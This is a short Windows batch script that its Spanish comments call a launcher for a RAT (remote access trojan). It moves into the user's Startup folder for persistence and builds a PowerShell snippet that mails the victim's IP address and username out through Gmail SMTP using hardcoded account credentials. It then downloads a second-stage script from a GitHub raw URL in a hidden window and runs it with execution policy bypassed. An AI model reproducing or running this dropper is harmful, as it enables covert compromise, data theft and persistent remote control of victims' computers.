@echo off
@REM Launcher para el RAT

@REM Variables
@REM Locacion inicial
set "INITIALPATH=%cd%"
@REM definr directorio inicio de programas.
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Dirigirse al direcrotio del inicio de windows.
cd  %STARTUP%

@REM Estableciendo SMTP
(
	echo $Email = "robertog@gmail.com"
	echo $Password = "12334feWFr22!"

	echo $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress 
	echo echo "ip:$ip" > "$env:UserName.txt"


	#Proceso del corero
	echo $subject = "$env:UserName logs"
	echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
	echo $smtp.EnableSSL = $true
	echo $smtp.Credentials = New-Object System.Net.NetworkCredential($Email, $Password);
	echo $smtp.Send($Email, $Email, $subject, $ip);
) > smtp.txt

@REM Ejecutar payloads al inicio.
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"

@REM Corriendo el payload
@REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd

@REM Borramos el iniciador
@REM cd %INITIALPATH%
@REM DEL "initial.cmd"